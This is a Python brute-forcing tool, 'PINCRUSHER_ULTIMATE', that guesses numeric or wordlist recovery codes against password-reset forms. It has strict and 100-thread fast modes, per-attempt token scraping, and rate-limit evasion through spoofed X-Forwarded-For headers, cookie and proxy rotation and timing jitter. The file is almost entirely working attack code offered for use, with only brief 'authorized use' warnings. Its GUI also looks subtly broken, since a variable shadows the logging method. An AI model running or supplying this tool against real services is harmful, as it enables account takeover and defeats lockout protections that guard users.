#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PINCRUSHER_ULTIMATE
Author: 0xgle
License: MIT

World-class, all-in-one OTP/PIN brute-forcer for CTFs & authorized pentests.

Highlights:
- Modes: STRICT (per-attempt token, rate-aware) & FAST (multithread)
- Sources: numeric range (e.g., 0000..9999) OR wordlist (any strings)
- Success detection: no 'error=' redirects, optional success phrase, baseline-aware
- Anti-rate: delay+jitter, backoff, per-attempt token, 429 detection, 'Time elapsed' heuristics
- Session rotation (cookies file) & proxy rotation (file)
- Token autodiscovery via BeautifulSoup (if available) with regex fallback
- Resume support; JSONL logs; save found code; verbosity control; debug artifacts
- GUI (Tkinter) form for running without CLI args

Deps:
  - requests
  - beautifulsoup4 (optional, improves token parsing)
  - Tkinter (std lib; on some Linux distros: `sudo apt install python3-tk`)
"""

import argparse
import os
import re
import sys
import json
import time
import random
import threading
from typing import Optional, List, Tuple, Iterable
from urllib.parse import urlparse, urljoin

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Optional BeautifulSoup for better token parsing
try:
    from bs4 import BeautifulSoup
    HAVE_BS4 = True
except Exception:
    HAVE_BS4 = False

# Optional Tkinter GUI
try:
    import tkinter as tk
    from tkinter import ttk, filedialog, messagebox
    HAVE_TK = True
except Exception:
    HAVE_TK = False

# ---------------- Defaults / Constants ----------------
ERROR_TEXT_DEFAULT    = "Invalid or expired recovery code!"
TIME_ELAPSED_KEY      = "time elapsed"
FIELD_CODE_DEFAULT    = "recovery_code"
FIELD_TOKEN_DEFAULT   = "s"

BANNER = r"""
 ██████╗ ███╗   ███╗███╗   ██╗ ██╗
██╔═══██╗████╗ ████║████╗  ██║███║
██║   ██║██╔████╔██║██╔██╗ ██║╚██║
██║   ██║██║╚██╔╝██║██║╚██╗██║ ██║
╚██████╔╝██║ ╚═╝ ██║██║ ╚████║ ██║
 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═╝  PinCrusher by 0xgle
"""

# ---------------- Utility / plumbing ----------------
def eprint(*a, **k): print(*a, file=sys.stderr, **k)

def rand_ip() -> str:
    return ".".join(str(random.randint(1,255)) for _ in range(4))

def ensure_leading_slash(p: str) -> str:
    return p if p.startswith("/") else "/" + p

def base_headers(ref: str) -> dict:
    return {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko Firefox",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive",
        "Referer": ref,
    }

def make_headers(ref: str, cookie_kv: Optional[str], rotate_xff: bool) -> dict:
    h = base_headers(ref)
    if cookie_kv:
        h["Cookie"] = cookie_kv
    if rotate_xff:
        h["X-Forwarded-For"] = rand_ip()
    return h

def read_lines(path: str) -> List[str]:
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [ln.strip() for ln in f if ln.strip()]

def session_for_proxy(proxy: Optional[str]) -> requests.Session:
    s = requests.Session()
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

# ---------------- Token extraction ----------------
def extract_token_html(html: str, token_field: str) -> Optional[str]:
    """Extract the hidden token value from HTML form."""
    if HAVE_BS4:
        try:
            soup = BeautifulSoup(html, "html.parser")
            el = soup.find("input", {"name": token_field})
            if el and el.has_attr("value"):
                return el["value"]
        except Exception:
            pass
    m = re.search(rf'name=[\'"]{re.escape(token_field)}[\'"]\s+value=[\'"]([^\'"]+)[\'"]',
                  html, flags=re.IGNORECASE)
    return m.group(1) if m else None

def fetch_token(sess: requests.Session, url: str, cookie_kv: Optional[str],
                rotate_xff: bool, timeout: int, token_field: str) -> Optional[str]:
    """GET the form page and extract the fresh per-attempt hidden token."""
    r = sess.get(url, headers=make_headers(url, cookie_kv, rotate_xff),
                 timeout=timeout, allow_redirects=True)
    return extract_token_html(r.text, token_field)

# ---------------- Success / error logic ----------------
def is_error_body(resp: requests.Response, error_text: str) -> bool:
    return error_text.lower() in (resp.text or "").lower()

def is_time_elapsed(resp: requests.Response, time_key: str) -> bool:
    loc = (resp.headers.get("Location") or "")
    return time_key in loc.lower()

def is_success_redirect(resp: requests.Response) -> bool:
    if resp.status_code in (301,302,303,307,308):
        loc = (resp.headers.get("Location") or "")
        return "error=" not in loc.lower()
    return False

# ---------------- Sources (codes) ----------------
def gen_numeric(pin_len: int, start: Optional[int], end: Optional[int],
                shuffle: bool) -> Iterable[str]:
    lo = 0 if start is None else max(0, start)
    hi = (10**pin_len - 1) if end is None else min(10**pin_len - 1, end)
    arr = [f"{i:0{pin_len}d}" for i in range(lo, hi+1)]
    if shuffle:
        random.shuffle(arr)
    return arr

def gen_wordlist(path: str, shuffle: bool) -> Iterable[str]:
    arr = read_lines(path)
    if shuffle:
        random.shuffle(arr)
    return arr

# ---------------- Resume / logs ----------------
def load_resume(path: Optional[str]) -> set:
    """Load JSONL file; collect previously tried codes to skip them."""
    if not path or not os.path.exists(path):
        return set()
    tried = set()
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            try:
                j = json.loads(ln.strip())
                if j.get("code"):
                    tried.add(j["code"])
            except Exception:
                continue
    return tried

def append_jsonl(path: Optional[str], obj: dict):
    if not path: return
    with open(path, "a", encoding="utf-8") as f:
        f.write(json.dumps(obj, ensure_ascii=False) + "\n")

# ---------------- STRICT mode (sequential) ----------------
def run_strict(args, log_cb=print):
    """Strict mode: sequential, per-attempt token, rate-aware."""
    target = args.target
    path   = ensure_leading_slash(args.path)
    url    = f"http://{target}{path}"

    cookies = [args.cookie.strip()] if args.cookie else []
    if args.cookie_file:
        cookies = read_lines(args.cookie_file)
    if not cookies:
        log_cb("[!] STRICT requires at least one cookie (--cookie or --cookie-file).")
        return

    proxies = read_lines(args.proxy_file) if args.proxy_file else []

    # Build source of codes
    if args.wordlist:
        source = gen_wordlist(args.wordlist, args.shuffle)
    else:
        source = gen_numeric(args.pin_len, args.range_start, args.range_end, args.shuffle)

    tried_set = load_resume(args.resume)
    t0 = time.time()
    total = args.estimate_total or None

    ci = 0  # cookie index
    pi = 0  # proxy index
    count = 0

    # Optional baseline (debug artifacts)
    if args.debug:
        try:
            sess = session_for_proxy(proxies[pi] if proxies else None)
            tok = fetch_token(sess, url, cookies[ci], args.rotate_xff, args.timeout, args.token_field) or ""
            resp0 = sess.post(url, headers=make_headers(url, cookies[ci], args.rotate_xff),
                              data={args.code_field: "0000", args.token_field: tok},
                              timeout=args.timeout, allow_redirects=False)
            with open("baseline_probe.html", "wb") as f:
                f.write(resp0.content)
            with open("baseline_headers.txt", "w") as f:
                for k,v in resp0.headers.items(): f.write(f"{k}: {v}\n")
            if args.verbose:
                log_cb("[i] Saved baseline_probe.*")
        except Exception as e:
            if args.verbose:
                log_cb(f"[!] Baseline failed: {e}")

    for code in source:
        if code in tried_set:
            continue
        count += 1

        cookie_kv = cookies[ci]
        proxy     = proxies[pi] if proxies else None
        sess      = session_for_proxy(proxy)

        # Fresh token per attempt
        token = None
        for _ in range(2):
            try:
                token = fetch_token(sess, url, cookie_kv, args.rotate_xff, args.timeout, args.token_field)
                if token: break
            except requests.RequestException:
                pass
            time.sleep(args.backoff)

        if not token:
            # Rotate cookie/proxy and move on
            ci = (ci + 1) % len(cookies)
            if proxies: pi = (pi + 1) % len(proxies)
            append_jsonl(args.log, {"ts": time.time(), "code": code, "event": "no_token", "cookie": cookie_kv, "proxy": proxy})
            rate_log(args, count, t0, total, log_cb)
            paced_sleep(args)
            continue

        success = False
        for attempt in range(1, args.retries + 1):
            try:
                resp = sess.post(url,
                                 headers=make_headers(url, cookie_kv, args.rotate_xff),
                                 data={args.code_field: code, args.token_field: token},
                                 timeout=args.timeout, allow_redirects=False)
            except requests.RequestException as e:
                append_jsonl(args.log, {"ts": time.time(), "code": code, "event": "req_error", "error": str(e)})
                time.sleep(args.backoff)
                continue

            # Known error in body → fail fast
            if args.error_text and is_error_body(resp, args.error_text):
                break

            # Timing/anti-rate lock
            if is_time_elapsed(resp, args.time_key) or resp.status_code in (429, 503):
                time.sleep(args.backoff)
                token = fetch_token(sess, url, cookie_kv, args.rotate_xff, args.timeout, args.token_field) or token
                continue

            # Redirect without error= → success candidate
            if is_success_redirect(resp):
                success = True
                if args.require_hint and args.success_hint:
                    try:
                        follow = sess.get(urljoin(url, resp.headers.get("Location","")),
                                          headers=make_headers(url, cookie_kv, args.rotate_xff),
                                          timeout=args.timeout, allow_redirects=True)
                        if args.success_hint.lower() not in (follow.text or "").lower():
                            success = False
                    except requests.RequestException:
                        success = False
                if success and args.debug:
                    with open("suspected_success_headers.txt","w") as f:
                        for k,v in resp.headers.items(): f.write(f"{k}: {v}\n")
                break

            # Unknown pattern → treat as fail for this code
            break

        if success:
            log_cb(f"[+] SUCCESS → Code: {code}")
            append_jsonl(args.log, {"ts": time.time(), "code": code, "event": "success"})
            if args.save:
                with open(args.save, "w") as f:
                    f.write(code + "\n")
            return

        append_jsonl(args.log, {"ts": time.time(), "code": code, "event": "fail"})

        # Periodic rotation to avoid sticky throttles
        if args.rotate_every and (count % args.rotate_every == 0):
            ci = (ci + 1) % len(cookies)
            if proxies: pi = (pi + 1) % len(proxies)

        rate_log(args, count, t0, total, log_cb)
        paced_sleep(args)

    log_cb("[-] Finished: no valid code found in the tested set.")

def paced_sleep(args):
    """Sleep with delay +/- jitter to look less robotic and widen timing windows."""
    low = max(0.0, args.delay - args.jitter)
    high = args.delay + args.jitter
    time.sleep(random.uniform(low, high))

def rate_log(args, count, t0, total, log_cb):
    if args.silent: return
    if count % args.progress_every == 0:
        rate = count / max(1e-6, (time.time() - t0))
        if total:
            log_cb(f"[i] Tried {count}/{total} (~{rate:.2f} req/s)")
        else:
            log_cb(f"[i] Tried {count} (~{rate:.2f} req/s)")

# ---------------- FAST mode (multithreaded, hardened) ----------------
def fast_worker(code: str, url: str, cookie_kv: str, timeout: int, rotate_xff: bool,
                code_field: str, token_field: str, static_token: str,
                error_text: Optional[str], success_hint: Optional[str], require_hint: bool) -> Tuple[str, bool]:
    """
    Hardened fast rule:
      - allow_redirects=True (final URL & body)
      - reject if body contains known error text
      - reject if final URL contains 'error='
      - reject if final PATH == reset path (no progress)
      - optional success hint check (if required)
      - otherwise treat "progress to a different path without error=" as success
    """
    try:
        resp = requests.post(url,
            headers=make_headers(url, cookie_kv, rotate_xff),
            data={code_field: code, token_field: static_token},
            timeout=timeout, allow_redirects=True)
    except requests.RequestException:
        return code, False

    body_low = (resp.text or "").lower()
    if error_text and (error_text.lower() in body_low):
        return code, False

    final_url = resp.url or ""
    if "error=" in final_url.lower():
        return code, False

    if require_hint and success_hint:
        return code, (success_hint.lower() in body_low)

    # Ensure we left the reset path (otherwise it's likely a reject)
    final_path = urlparse(final_url).path
    reset_path = urlparse(url).path
    if final_path == reset_path:
        return code, False

    return code, True

def run_fast(args, log_cb=print):
    """Fast mode: multithreaded, best-effort detection (still safer than naive)."""
    target = args.target
    path   = ensure_leading_slash(args.path)
    url    = f"http://{target}{path}"

    cookies = [args.cookie.strip()] if args.cookie else []
    if args.cookie_file:
        cookies = read_lines(args.cookie_file)
    if not cookies:
        log_cb("[!] FAST requires a cookie (--cookie or --cookie-file).")
        return
    cookie_kv = cookies[0]  # FAST uses the first cookie

    # Build source
    if args.wordlist:
        source = list(gen_wordlist(args.wordlist, args.shuffle))
    else:
        source = list(gen_numeric(args.pin_len, args.range_start, args.range_end, args.shuffle))
    total = len(source)
    log_cb(f"[i] FAST mode → {total} candidates, threads={args.threads}")

    found = None
    tried = 0
    start = time.time()

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {
            ex.submit(
                fast_worker, code, url, cookie_kv, args.timeout, args.rotate_xff,
                args.code_field, args.token_field, args.static_token,
                args.error_text, args.success_hint, args.require_hint
            ): code for code in source
        }
        for fut in as_completed(futures):
            tried += 1
            code, ok = fut.result()
            if not args.silent and (tried % args.progress_every == 0):
                rate = tried / max(1e-6, time.time() - start)
                log_cb(f"[i] Tried {tried}/{total} (~{rate:.1f} req/s)")
            if ok:
                found = code
                break

    if found:
        log_cb(f"[+] SUCCESS (FAST) → Code: {found}")
        if args.save:
            with open(args.save, "w") as f:
                f.write(found + "\n")
    else:
        log_cb("[-] FAST finished: no code found.")

# ---------------- CLI ----------------
def parse_args(argv=None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="PINCRUSHER_ULTIMATE – robust OTP/PIN brute-forcer for CTF/pentest.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        add_help=True,
    )
    # Mode / endpoint
    p.add_argument("--target", help="host:port (e.g., 10.10.10.10:1337)")
    p.add_argument("--path", default="/reset_password.php", help="endpoint path")
    p.add_argument("--mode", choices=["strict","fast"], default="strict", help="mode")
    # Form fields
    p.add_argument("--code-field", default=FIELD_CODE_DEFAULT, help="form field for code/PIN")
    p.add_argument("--token-field", default=FIELD_TOKEN_DEFAULT, help="form field for hidden token")
    # Cookies
    p.add_argument("--cookie", help='single cookie string, e.g., "PHPSESSID=abc123"')
    p.add_argument("--cookie-file", help="file with cookie strings (one per line)")
    # Proxy
    p.add_argument("--proxy-file", help="file with proxies (http://host:port per line)")
    p.add_argument("--rotate-every", type=int, default=0, help="rotate cookie/proxy every N attempts (STRICT)")
    # Sources
    p.add_argument("--wordlist", help="path to wordlist (one candidate per line)")
    p.add_argument("--pin-len", type=int, default=4, help="PIN length for numeric mode")
    p.add_argument("--range-start", type=int, help="numeric start (inclusive)")
    p.add_argument("--range-end", type=int, help="numeric end (inclusive)")
    p.add_argument("--shuffle", action="store_true", help="shuffle candidate order")
    # Detection
    p.add_argument("--error-text", default=ERROR_TEXT_DEFAULT, help="error substring in body")
    p.add_argument("--success-hint", default="", help="optional success phrase (after follow)")
    p.add_argument("--require-hint", action="store_true", help="require success hint for success verdict")
    p.add_argument("--time-key", default=TIME_ELAPSED_KEY, help="substring to detect timing lock in Location")
    # Timing
    p.add_argument("--timeout", type=int, default=6, help="HTTP timeout")
    p.add_argument("--delay", type=float, default=0.55, help="delay between attempts (STRICT)")
    p.add_argument("--jitter", type=float, default=0.15, help="+/- jitter")
    p.add_argument("--retries", type=int, default=3, help="retries per code when timing lock hits")
    p.add_argument("--backoff", type=float, default=1.8, help="backoff sleep on rate/timing")
    p.add_argument("--rotate-xff", action="store_true", help="send random X-Forwarded-For")
    # FAST
    p.add_argument("--threads", type=int, default=100, help="number of threads (FAST)")
    p.add_argument("--static-token", default="179", help="static token for FAST (if used by target)")
    # Logs / resume
    p.add_argument("--resume", help="JSONL file to resume from (skips tried codes)")
    p.add_argument("--log", help="JSONL log file to append results")
    p.add_argument("--save", help="save found code to file")
    p.add_argument("--progress-every", type=int, default=50, help="print progress every N attempts")
    p.add_argument("--estimate-total", type=int, help="hint for total count (for rate calc)")
    # Output
    p.add_argument("--verbose", action="store_true", help="verbose stderr logging")
    p.add_argument("--silent", action="store_true", help="only print success/final")
    p.add_argument("--debug", action="store_true", help="dump baseline/suspected artifacts")
    # GUI
    p.add_argument("--gui", action="store_true", help="launch Tkinter GUI")
    return p.parse_args(argv)

# ---------------- GUI (Tkinter) ----------------
class CrusherGUI:
    """Simple Tkinter front-end for PINCRUSHER_ULTIMATE."""
    def __init__(self, root):
        self.root = root
        root.title("PINCRUSHER_ULTIMATE")
        self.make_widgets()

    def make_widgets(self):
        frm = ttk.Frame(self.root, padding=10)
        frm.grid(sticky="nsew")
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)

        # Target/Path/Mode
        self.target = tk.StringVar()
        self.path = tk.StringVar(value="/reset_password.php")
        self.mode = tk.StringVar(value="strict")

        row = 0
        ttk.Label(frm, text="Target (host:port):").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.target, width=30).grid(row=row, column=1, sticky="ew"); row+=1

        ttk.Label(frm, text="Path:").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.path, width=30).grid(row=row, column=1, sticky="ew"); row+=1

        ttk.Label(frm, text="Mode:").grid(row=row, column=0, sticky="w")
        ttk.Radiobutton(frm, text="STRICT", value="strict", variable=self.mode).grid(row=row, column=1, sticky="w")
        ttk.Radiobutton(frm, text="FAST", value="fast", variable=self.mode).grid(row=row, column=1, sticky="e"); row+=1

        # Cookies / files
        self.cookie = tk.StringVar()
        self.cookie_file = tk.StringVar()
        self.proxy_file = tk.StringVar()

        ttk.Label(frm, text="Cookie (e.g., PHPSESSID=...):").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.cookie, width=40).grid(row=row, column=1, sticky="ew"); row+=1

        ttk.Label(frm, text="Cookies file:").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.cookie_file, width=40).grid(row=row, column=1, sticky="ew")
        ttk.Button(frm, text="...", command=self.pick_cookie_file).grid(row=row, column=2); row+=1

        ttk.Label(frm, text="Proxies file:").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.proxy_file, width=40).grid(row=row, column=1, sticky="ew")
        ttk.Button(frm, text="...", command=self.pick_proxy_file).grid(row=row, column=2); row+=1

        # Source
        self.wordlist = tk.StringVar()
        self.pin_len = tk.IntVar(value=4)
        self.shuffle = tk.BooleanVar(value=False)

        ttk.Label(frm, text="Wordlist (optional):").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.wordlist, width=40).grid(row=row, column=1, sticky="ew")
        ttk.Button(frm, text="...", command=self.pick_wordlist).grid(row=row, column=2); row+=1

        ttk.Label(frm, text="PIN length:").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.pin_len, width=10).grid(row=row, column=1, sticky="w")
        ttk.Checkbutton(frm, text="Shuffle", variable=self.shuffle).grid(row=row, column=1, sticky="e"); row+=1

        # Detection / timing
        self.error_text = tk.StringVar(value=ERROR_TEXT_DEFAULT)
        self.success_hint = tk.StringVar(value="")
        self.require_hint = tk.BooleanVar(value=False)
        self.time_key = tk.StringVar(value=TIME_ELAPSED_KEY)

        ttk.Label(frm, text="Error text:").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.error_text, width=40).grid(row=row, column=1, sticky="ew"); row+=1

        ttk.Label(frm, text="Success hint (optional):").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.success_hint, width=40).grid(row=row, column=1, sticky="ew")
        ttk.Checkbutton(frm, text="Require hint", variable=self.require_hint).grid(row=row, column=2, sticky="w"); row+=1

        self.timeout = tk.IntVar(value=6)
        self.delay = tk.DoubleVar(value=0.55)
        self.jitter = tk.DoubleVar(value=0.15)
        self.retries = tk.IntVar(value=3)
        self.backoff = tk.DoubleVar(value=1.8)
        self.rotate_xff = tk.BooleanVar(value=True)

        ttk.Label(frm, text="Timeout (s):").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.timeout, width=10).grid(row=row, column=1, sticky="w"); row+=1

        ttk.Label(frm, text="Delay / Jitter (s):").grid(row=row, column=0, sticky="w")
        dj = ttk.Frame(frm); dj.grid(row=row, column=1, sticky="w")
        ttk.Entry(dj, textvariable=self.delay, width=8).grid(row=0, column=0)
        ttk.Entry(dj, textvariable=self.jitter, width=8).grid(row=0, column=1)
        ttk.Checkbutton(frm, text="Rotate XFF", variable=self.rotate_xff).grid(row=row, column=2, sticky="w"); row+=1

        self.threads = tk.IntVar(value=100)
        ttk.Label(frm, text="Threads (FAST):").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.threads, width=10).grid(row=row, column=1, sticky="w"); row+=1

        self.static_token = tk.StringVar(value="179")
        ttk.Label(frm, text="Static token (FAST):").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.static_token, width=10).grid(row=row, column=1, sticky="w"); row+=1

        # Output / files
        self.rotate_every = tk.IntVar(value=0)
        self.resume = tk.StringVar()
        self.log = tk.StringVar()
        self.save = tk.StringVar()
        self.progress_every = tk.IntVar(value=50)
        self.verbose = tk.BooleanVar(value=False)
        self.silent = tk.BooleanVar(value=False)
        self.debug = tk.BooleanVar(value=False)

        ttk.Label(frm, text="Rotate cookie/proxy every N (STRICT):").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.rotate_every, width=10).grid(row=row, column=1, sticky="w"); row+=1

        ttk.Label(frm, text="Resume JSONL:").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.resume, width=40).grid(row=row, column=1, sticky="ew")
        ttk.Button(frm, text="...", command=lambda: self.pick_file(self.resume)).grid(row=row, column=2); row+=1

        ttk.Label(frm, text="Log JSONL:").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.log, width=40).grid(row=row, column=1, sticky="ew")
        ttk.Button(frm, text="...", command=lambda: self.pick_file(self.log)).grid(row=row, column=2); row+=1

        ttk.Label(frm, text="Save found code:").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.save, width=40).grid(row=row, column=1, sticky="ew")
        ttk.Button(frm, text="...", command=lambda: self.pick_file(self.save)).grid(row=row, column=2); row+=1

        ttk.Label(frm, text="Progress every:").grid(row=row, column=0, sticky="w")
        ttk.Entry(frm, textvariable=self.progress_every, width=10).grid(row=row, column=1, sticky="w"); row+=1

        chk = ttk.Frame(frm); chk.grid(row=row, column=0, columnspan=3, sticky="w")
        ttk.Checkbutton(chk, text="Verbose", variable=self.verbose).grid(row=0, column=0, sticky="w")
        ttk.Checkbutton(chk, text="Silent", variable=self.silent).grid(row=0, column=1, sticky="w")
        ttk.Checkbutton(chk, text="Debug", variable=self.debug).grid(row=0, column=2, sticky="w"); row+=1

        # Start/Output
        btns = ttk.Frame(frm); btns.grid(row=row, column=0, columnspan=3, sticky="ew", pady=(8,4))
        ttk.Button(btns, text="Start", command=self.start).grid(row=0, column=0, padx=4)
        ttk.Button(btns, text="Stop", command=self.stop).grid(row=0, column=1, padx=4)
        ttk.Button(btns, text="Quit", command=self.root.quit).grid(row=0, column=2, padx=4)

        self.output = tk.Text(frm, height=16, width=90)
        self.output.grid(row=row+1, column=0, columnspan=3, sticky="nsew", pady=(6,0))
        frm.rowconfigure(row+1, weight=1)
        frm.columnconfigure(1, weight=1)

        self._worker = None
        self._stop_event = threading.Event()

    def pick_file(self, var):
        path = filedialog.asksaveasfilename() if var in (self.save,) else filedialog.askopenfilename()
        if path:
            var.set(path)

    def pick_cookie_file(self):
        p = filedialog.askopenfilename()
        if p: self.cookie_file.set(p)

    def pick_proxy_file(self):
        p = filedialog.askopenfilename()
        if p: self.proxy_file.set(p)

    def pick_wordlist(self):
        p = filedialog.askopenfilename()
        if p: self.wordlist.set(p)

    def log(self, msg):
        self.output.insert("end", msg + "\n")
        self.output.see("end")
        self.output.update()

    def start(self):
        if self._worker and self._worker.is_alive():
            messagebox.showinfo("Info", "Already running.")
            return
        self._stop_event.clear()
        args = self.collect_args()
        self.log("⚠️  Use only with authorization. Starting...\n")

        def target():
            try:
                if args.mode == "fast":
                    run_fast(args, log_cb=self.log)
                else:
                    run_strict(args, log_cb=self.log)
            except Exception as e:
                self.log(f"[x] Error: {e}")

        self._worker = threading.Thread(target=target, daemon=True)
        self._worker.start()

    def stop(self):
        # Soft signal; actual workers check timing per attempt.
        self._stop_event.set()
        self.log("[!] Stop requested (press Ctrl+C in terminal if it hangs).")

    def collect_args(self):
        # Build argparse-like namespace from GUI fields
        ns = argparse.Namespace()
        ns.target = self.target.get().strip()
        ns.path = self.path.get().strip() or "/reset_password.php"
        ns.mode = self.mode.get()

        ns.cookie = self.cookie.get().strip() or None
        ns.cookie_file = self.cookie_file.get().strip() or None
        ns.proxy_file = self.proxy_file.get().strip() or None

        ns.wordlist = self.wordlist.get().strip() or None
        ns.pin_len = int(self.pin_len.get() or 4)
        ns.range_start = None
        ns.range_end = None
        ns.shuffle = bool(self.shuffle.get())

        ns.code_field = FIELD_CODE_DEFAULT
        ns.token_field = FIELD_TOKEN_DEFAULT

        ns.error_text = self.error_text.get().strip() or ERROR_TEXT_DEFAULT
        ns.success_hint = self.success_hint.get().strip() or ""
        ns.require_hint = bool(self.require_hint.get())
        ns.time_key = TIME_ELAPSED_KEY

        ns.timeout = int(self.timeout.get() or 6)
        ns.delay = float(self.delay.get() or 0.55)
        ns.jitter = float(self.jitter.get() or 0.15)
        ns.retries = int(self.retries.get() or 3)
        ns.backoff = float(self.backoff.get() or 1.8)
        ns.rotate_xff = bool(self.rotate_xff.get())

        ns.threads = int(self.threads.get() or 100)
        ns.static_token = self.static_token.get().strip() or "179"

        ns.rotate_every = int(self.rotate_every.get() or 0)
        ns.resume = self.resume.get().strip() or None
        ns.log = self.log.get().strip() or None
        ns.save = self.save.get().strip() or None
        ns.progress_every = int(self.progress_every.get() or 50)
        ns.estimate_total = None
        ns.verbose = bool(self.verbose.get())
        ns.silent = bool(self.silent.get())
        ns.debug = bool(self.debug.get())
        return ns

# ---------------- Interactive CLI ----------------
def interactive_cli():
    print(BANNER)
    print("No arguments detected → interactive CLI mode.\n")
    target = input("Target (host:port): ").strip()
    path = input("Path [/reset_password.php]: ").strip() or "/reset_password.php"
    mode = (input("Mode [strict/fast] (strict): ").strip() or "strict").lower()

    ns = parse_args([
        "--target", target,
        "--path", path,
        "--mode", mode,
    ])
    ck = input('Cookie (e.g., PHPSESSID=..., empty = ask for cookie file): ').strip()
    if ck:
        ns.cookie = ck
    else:
        cf = input("Cookies file (optional): ").strip()
        ns.cookie_file = cf or None

    wl = input("Wordlist (empty = numeric PIN mode): ").strip()
    if wl:
        ns.wordlist = wl
    else:
        pin = input("PIN length (4): ").strip() or "4"
        ns.pin_len = int(pin)

    ns.rotate_xff = True
    print("\nStarting in 1s…")
    time.sleep(1)

    if ns.mode == "fast":
        run_fast(ns)
    else:
        run_strict(ns)

# ---------------- Main ----------------
def main():
    args = parse_args()

    # If no args & TTY → interactive CLI
    if not any([args.target, args.gui]) and sys.stdin.isatty():
        return interactive_cli()

    # GUI mode
    if args.gui:
        if not HAVE_TK:
            eprint("[x] Tkinter not available. Install python3-tk or run without --gui.")
            sys.exit(2)
        root = tk.Tk()
        app = CrusherGUI(root)
        root.mainloop()
        return

    # Standard CLI
    print("⚠️  Use only on systems you own or have explicit permission to test.\n")
    if args.mode == "fast":
        run_fast(args)
    else:
        run_strict(args)

if __name__ == "__main__":
    main()
